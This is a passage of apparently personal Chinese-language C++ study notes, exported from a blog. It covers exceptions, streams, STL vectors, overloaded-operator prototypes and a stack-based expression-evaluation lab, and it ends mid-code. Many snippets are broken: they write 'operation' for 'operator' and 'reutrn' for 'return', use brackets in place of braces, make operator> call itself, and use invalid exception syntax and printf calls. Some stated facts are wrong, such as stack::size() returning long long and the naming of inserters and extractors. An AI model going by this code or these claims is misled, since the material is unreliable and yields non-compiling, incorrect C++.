<h2 id="using-inheritance-使用继承"><a href="#using-inheritance-使用继承" class="headerlink" title="using inheritance( 使用继承 )"></a>using inheritance( 使用继承 )</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">abc</span><span class="params">(<span class="keyword">int</span> a)</span> : throw(MathErr)&#123;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ab</span><span class="params">(<span class="keyword">int</span> a)</span> : throw()&#123;</span></span><br><span class="line">    ... <span class="comment">//不抛任何异常</span></span><br><span class="line">&#125;</span><br><span class="line">abc 只能抛出abc的异常。限制abc自己处理异常</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220915133840390.png" alt="image-20220915133840390"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220915134012787.png" alt="image-20220915134012787"></p>
<h2 id="Failure-in-constructors"><a href="#Failure-in-constructors" class="headerlink" title="Failure in constructors:"></a>Failure in constructors:</h2><ul>
<li>No return value is possible</li>
<li>Use an “uninitialized flag”</li>
<li>Defer work to an Init() function</li>
</ul>
<p><em>Better</em>: Throw an exception</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220915134232488.png" alt="image-20220915134232488"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220915134726625.png" alt="image-20220915134726625"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220915135236538.png" alt="image-20220915135236538"></p>
<p>更多学习： <a href="https://www.runoob.com/cplusplus/cpp-exceptions-handling.html">https://www.runoob.com/cplusplus/cpp-exceptions-handling.html</a></p>
<h1 id="第三十四章-流的概念"><a href="#第三十四章-流的概念" class="headerlink" title="第三十四章 流的概念"></a>第三十四章 流的概念</h1><h2 id="Streams-流"><a href="#Streams-流" class="headerlink" title="Streams 流"></a>Streams 流</h2><h3 id="Originial-C-I-O-used-printf-scanf"><a href="#Originial-C-I-O-used-printf-scanf" class="headerlink" title="Originial C I/O used printf, scanf"></a>Originial C I/O used printf, scanf</h3><p>文件是有 文本和二进制的方式</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220921020707492.png" alt="image-20220921020707492"></p>
<p>C的 printf 和scanf 是不安全的</p>
<p>ifstream （i fstream） </p>
<p>ofstream  (o fstream)</p>
<h2 id="C-vs-C"><a href="#C-vs-C" class="headerlink" title="C vs. C++"></a>C vs. C++</h2><p>C stdio operations work</p>
<ul>
<li>don’t provide “object-oriented” features</li>
<li>No overloaded operators</li>
</ul>
<p>C++ </p>
<ul>
<li>Can overload inserters ( &gt;&gt; )and extractors ( &lt;&lt; )  </li>
</ul>
<p>Moral</p>
<ul>
<li>When converting C to C++, leave the  I/O intact</li>
</ul>
<h2 id="What-is-a-steam"><a href="#What-is-a-steam" class="headerlink" title="What is a steam?"></a>What is a steam?</h2><ul>
<li><p>Common logical interfface to a device (所有的东西都以一维度单方向的方式去访问)</p>
</li>
<li><p>流不能在任意地方读和写</p>
</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220921021451311.png" alt="image-20220921021451311"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220921021606743.png" alt="image-20220921021606743"></p>
<p>( &gt;&gt; 和 &lt;&lt; ) 跟 reciever 有关 </p>
<p>Manipulators</p>
<h2 id="Kinds-of-streams"><a href="#Kinds-of-streams" class="headerlink" title="Kinds of streams"></a>Kinds of streams</h2><ul>
<li>Text streams （文本流） 特殊的二进制文件 PARSE-&gt; 解析</li>
<li>Binary streams （二进制流）二进制文件（不以人的阅读为目的的文件）</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220921022415552.png" alt="image-20220921022415552"></p>
<h1 id="第三十五章-流的运算符"><a href="#第三十五章-流的运算符" class="headerlink" title="第三十五章 流的运算符"></a>第三十五章 流的运算符</h1><h1 id="第三十六章-STL简述"><a href="#第三十六章-STL简述" class="headerlink" title="第三十六章 STL简述"></a>第三十六章 STL简述</h1><h2 id="Data-struct-amp-algorithms"><a href="#Data-struct-amp-algorithms" class="headerlink" title="Data struct &amp; algorithms"></a>Data struct &amp; algorithms</h2><blockquote>
<ul>
<li><p>What is STL</p>
</li>
<li><p>part of thr ISO Standard C++ library</p>
</li>
<li><p>Data Structures and algorithms for  C++.</p>
</li>
</ul>
</blockquote>
<h2 id="Why-should-I-use-STL"><a href="#Why-should-I-use-STL" class="headerlink" title="Why should I use STL"></a>Why should I use STL</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220908000742688.png" alt="image-20220908000742688"></p>
<ul>
<li>减少开发时间</li>
<li>代码可读性</li>
<li>强壮性(处理好越界的问题)</li>
<li>可维护的代码</li>
<li>相对比较简单</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220908001205697.png" alt="image-20220908001205697"></p>
<h2 id="STL特点"><a href="#STL特点" class="headerlink" title="STL特点"></a>STL特点</h2><ul>
<li>Containers</li>
<li>Algorihms</li>
<li>Iterators (枚举器)</li>
</ul>
<h1 id="map-vector-list-链表"><a href="#map-vector-list-链表" class="headerlink" title="map. vector. list(链表)"></a>map. vector. list(链表)</h1><h1 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)&#123;</span><br><span class="line">        x.<span class="built_in">push_back</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt;::<span class="function">iterator p</span></span><br><span class="line"><span class="function">    <span class="title">for</span><span class="params">(p=x.begin(); p&lt;x.end(); p++)</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; *p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="重载运算符全部原型"><a href="#重载运算符全部原型" class="headerlink" title="重载运算符全部原型"></a>重载运算符全部原型</h1><h2 id="前缀-：-a"><a href="#前缀-：-a" class="headerlink" title="前缀++ ： ++a"></a>前缀++ ： ++a</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">number&amp; operation ++ ()&#123; <span class="comment">//++ 在前可以做左值</span></span><br><span class="line">    ++<span class="keyword">this</span>-&gt;a; 	</span><br><span class="line">    reutrn *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="后缀-：-a"><a href="#后缀-：-a" class="headerlink" title="后缀++： a++"></a>后缀++： a++</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> number operation ++ (<span class="keyword">int</span>)&#123; <span class="comment">// ++在后不可以做左值</span></span><br><span class="line">    <span class="function">number <span class="title">temp</span><span class="params">(*<span class="keyword">this</span>)</span></span>; </span><br><span class="line">    <span class="keyword">this</span>-&gt;a++；</span><br><span class="line">    reutrn temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="赋值运算符："><a href="#赋值运算符：" class="headerlink" title="赋值运算符：="></a>赋值运算符：=</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">number&amp; operation = (<span class="keyword">const</span> number &amp;num)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">this</span>-&gt;a != num.a)</span><br><span class="line">	    <span class="keyword">this</span>-&gt;a = num.a</span><br><span class="line">     <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="重载大小等于号"><a href="#重载大小等于号" class="headerlink" title="重载大小等于号"></a>重载大小等于号</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> operation &lt; (number&amp; number)&#123;</span><br><span class="line">    <span class="keyword">if</span>(*<span class="keyword">this</span>.a &lt; number.a) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> operation == (number&amp; number)[</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;a == number.a) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">]</span><br><span class="line"><span class="keyword">bool</span> operation &gt; (number&amp; number)&#123;</span><br><span class="line">    <span class="keyword">if</span>(*<span class="keyword">this</span> &gt; number) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> operation  &gt;=()</span><br></pre></td></tr></table></figure>
<h2 id="重载方括号"><a href="#重载方括号" class="headerlink" title="重载方括号"></a>重载方括号</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> &amp;operation [](<span class="keyword">int</span> index)&#123;</span><br><span class="line">    <span class="keyword">return</span> array[index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重载 &gt;&gt; 和 &lt;&lt;</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;iostream&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pixel</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Pixel</span>() &#123; red = green = blue = <span class="number">0</span>;&#125;</span><br><span class="line">	<span class="built_in">Pixel</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> a, <span class="keyword">unsigned</span> <span class="keyword">int</span> b, <span class="keyword">unsigned</span> <span class="keyword">int</span> c)&#123;</span><br><span class="line">		red = a;</span><br><span class="line">		green = b;</span><br><span class="line">		blue = c;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Pixel</span>(<span class="keyword">const</span> Pixel&amp; p)&#123;</span><br><span class="line">		red = p.red;</span><br><span class="line">		blue = p.blue;</span><br><span class="line">		green = p.green;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">friend</span> istream&amp; <span class="keyword">operator</span> &gt;&gt;(istream&amp; c, Pixel &amp;p);</span><br><span class="line">	<span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span> &lt;&lt;(ostream&amp; c, Pixel &amp;p);</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> red, green, blue;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">istream&amp; <span class="keyword">operator</span> &gt;&gt;(istream&amp; c, Pixel &amp;p)&#123;</span><br><span class="line">	c &gt;&gt; p.red &gt;&gt; p.green &gt;&gt; p.blue;</span><br><span class="line">	<span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">ostream&amp; <span class="keyword">operator</span> &lt;&lt;(ostream&amp; c, Pixel &amp;p)&#123;</span><br><span class="line">	c &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; p.red &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.green &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.blue &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Study</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>c++</tag>
        <tag>oop</tag>
      </tags>
  </entry>
  <entry>
    <title>表达式的值和计算</title>
    <url>/2022/06/16/Study/%E5%AE%9E%E9%AA%8C%E8%AF%BE%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%80%BC%E5%92%8C%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<h1 id="第一节课内容"><a href="#第一节课内容" class="headerlink" title="第一节课内容:"></a>第一节课内容:</h1><p>​    预备学习课题任务: 学习使用C++ STL-栈应用<br>​    基本任务: 算数表达式求值(应用map容器)<br>​    扩展任务1:较复杂的表达式求值和交互式求值(难,模板化实现)<br>​    扩展任务2: 求真值表达式的应用<br>​    扩展任务3: 二元树和表达式</p>
<h2 id="基本任务"><a href="#基本任务" class="headerlink" title="基本任务:"></a>基本任务:</h2><h3 id="STL-栈应用的实现"><a href="#STL-栈应用的实现" class="headerlink" title="STL-栈应用的实现:"></a>STL-栈应用的实现:</h3><ol>
<li>创建一个stack类模板: 名字为stk;</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span> &gt; stk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><h4 id="push-用来把元素入栈"><a href="#push-用来把元素入栈" class="headerlink" title="push() 用来把元素入栈"></a>push() 用来把元素入栈</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> n;</span><br><span class="line">		cin&gt;&gt;n;</span><br><span class="line">		stk.<span class="built_in">push</span>(n); <span class="comment">//stk.push(n) 把n加入到栈中</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><h4 id="top-用来访问栈顶元素"><a href="#top-用来访问栈顶元素" class="headerlink" title="top() 用来访问栈顶元素"></a>top() 用来访问栈顶元素</h4></li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> n;</span><br><span class="line">		cin&gt;&gt;n;</span><br><span class="line">		stk.<span class="built_in">push</span>(n);</span><br><span class="line">        <span class="comment">//0 1 2 3</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line">    <span class="comment">// 输出3 //stk.top()的值 也就是栈顶的值3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>pop() 弹出栈顶元素</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	stk.<span class="built_in">pop</span>();<span class="comment">//移除栈顶元素 (无返回值)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line">    <span class="comment">//输出2 //弹出栈顶后还有一个值就是2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>empty() 判断栈空?</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) </span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	stk.<span class="built_in">empty</span>();  <span class="comment">//判断栈是否为空,如果为空则输出true,否则输出false</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		cout&lt;&lt;<span class="string">&quot;此时栈顶的值为&quot;</span>&lt;&lt;stk.<span class="built_in">top</span>()&lt;&lt;endl;</span><br><span class="line">		stk.<span class="built_in">pop</span>(); <span class="comment">//弹出元素</span></span><br><span class="line">		cout&lt;&lt;boolalpha&lt;&lt;<span class="string">&quot;栈空?:&quot;</span>&lt;&lt;stk.<span class="built_in">empty</span>()&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/* 输出结果:</span></span><br><span class="line"><span class="comment">此时栈顶的值为3</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为2</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为1</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为0</span></span><br><span class="line"><span class="comment">栈空?:true</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>size() 统计栈中的元素</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) </span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>  n=stk.<span class="built_in">size</span>(); <span class="comment">//注意返回值为long long 类型</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,n);</span><br><span class="line">    <span class="comment">//输出:4  //此时栈中共有4个元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="简单算数表达式的求值"><a href="#简单算数表达式的求值" class="headerlink" title="简单算数表达式的求值"></a>简单算数表达式的求值</h3><p>​    两个栈的原理: 符号栈和 数值栈</p>
<p>​    大致意思: 检索到数字的时候,扔到数值栈,检索到符号的时候,比较符号的优先级(map函数的用法);</p>
<blockquote>
<p>  Map是STL 的一个关联容器，它提供一对一（其中第一个可以称为关键字，每个关键字只能在map中出现一次，第二个可能称为该关键字的值）的数据处理能力，由于这个特性，它完成有可能在我们处理一对一数据的时候，在编程上提供快速通道。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//map容器定义方法:</span></span><br><span class="line">map&lt;<span class="keyword">int</span>,string&gt; m; <span class="comment">//定义一个键值为int 实值为string的关联容器</span></span><br><span class="line"><span class="comment">//map容器赋值方法:</span></span><br><span class="line">m[<span class="number">1000</span>]=<span class="string">&quot;测试&quot;</span>;<span class="comment">//赋值</span></span><br><span class="line">cout&lt;&lt;m[<span class="number">1000</span>]&lt;&lt;endl;<span class="comment">//打印/输出</span></span><br><span class="line"><span class="comment">//***输出结果***</span></span><br><span class="line"><span class="comment">//&amp; 测试</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>大致思路:</p>
<p>​    输入一串表达式:</p>
<p>​    <strong>遇到数字时:</strong> 数字入<strong>操作数栈</strong></p>
<p>​    <strong>遇到操作字符ch时:</strong> 当字符ch的栈外优先级大于<strong>操作符栈</strong>栈顶元素θ的栈内优先级的时候, 这个字符ch入栈. 否则(即要处理字符ch的栈内优先级小于或者等于<strong>操作符栈</strong>栈顶元素θ的栈内优先级时)将<strong>操作数栈</strong>弹出两个元素,与<strong>操作符栈</strong>栈顶元素θ的符号,进行加减乘除的操作,即num.top(1) θ num.top(2),得出的结构入<strong>操作符栈</strong>(push(num.top(1) θ num.top(2)))并将θ弹出,加入要处理字符ch;</p>
<p>当遇到’)’时: 处理括号内的表达式:”(ABC)”的结果并加入到<strong>操作数栈</strong>(方法如同字符遇到’#’的操作)</p>
<p><strong>当没有要处理的数字或者符号时,输入#为结束标志:</strong>此时,循环操作: 从操作数栈中弹出两个数字,从<strong>操作符栈</strong>中弹出一个符号,进行四则运算;—-&gt;<strong>直到栈空</strong>(即操作符栈遇到’#’/当进行括号匹配时则遇到’(‘);</p>
<p>最后操作数栈 栈顶即为表达式四则运算的结果</p>
<p>附上代码:(待优化)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//c++</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; icp; <span class="comment">//栈外优先级</span></span><br><span class="line">map&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; isp; <span class="comment">//站内优先级</span></span><br><span class="line">stack&lt;<span class="keyword">char</span> &gt; OPTR; <span class="comment">//操作符栈</span></span><br><span class="line">stack&lt;<span class="keyword">int</span> &gt; OPNR; <span class="comment">//操作数栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ispandicp</span><span class="params">()</span></span>&#123;	</span><br><span class="line">    icp[<span class="string">&#x27;#&#x27;</span>]=<span class="number">0</span>;icp[<span class="string">&#x27;(&#x27;</span>]=<span class="number">6</span>;</span><br><span class="line">	icp[<span class="string">&#x27;*&#x27;</span>]=<span class="number">4</span>;icp[<span class="string">&#x27;/&#x27;</span>]=<span class="number">4</span>;</span><br><span class="line">	icp[<span class="string">&#x27;%&#x27;</span>]=<span class="number">4</span>;icp[<span class="string">&#x27;+&#x27;</span>]=<span class="number">2</span>;</span><br><span class="line">	icp[<span class="string">&#x27;-&#x27;</span>]=<span class="number">2</span>;icp[<span class="string">&#x27;)&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="comment">//////////</span></span><br><span class="line">	isp[<span class="string">&#x27;#&#x27;</span>]=<span class="number">0</span>;isp[<span class="string">&#x27;(&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	isp[<span class="string">&#x27;*&#x27;</span>]=<span class="number">5</span>;isp[<span class="string">&#x27;/&#x27;</span>]=<span class="number">5</span>;</span><br><span class="line">	isp[<span class="string">&#x27;%&#x27;</span>]=<span class="number">5</span>;isp[<span class="string">&#x27;+&#x27;</span>]=<span class="number">3</span>;</span><br><span class="line">	isp[<span class="string">&#x27;-&#x27;</span>]=<span class="number">3</span>;isp[<span class="string">&#x27;)&#x27;</span>]=<span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">count</span><span class="params">(<span class="keyword">char</span> optr)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(OPTR.<span class="built_in">top</span>()!= optr) &#123;</span><br><span class="line">		<span class="keyword">int</span> a=OPNR.<span class="built_in">top</span>();</span><br><span class="line">		OPNR.<span class="built_in">pop</span>();</span><br><span class="line">		<span class="keyword">int</span> b=OPNR.<span class="built_in">top</span>();</span><br><span class="line">		OPNR.<span class="built_in">pop</span>();</span><br><span class="line">		<span class="keyword">char</span> c=OPTR.<span class="built_in">top</span>();</span><br><span class="line">		<span class="keyword">if</span>(c==<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">			OPNR.<span class="built_in">push</span>(a+b);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">			OPNR.<span class="built_in">push</span>(b-a);</span><br><span class="line">		<span 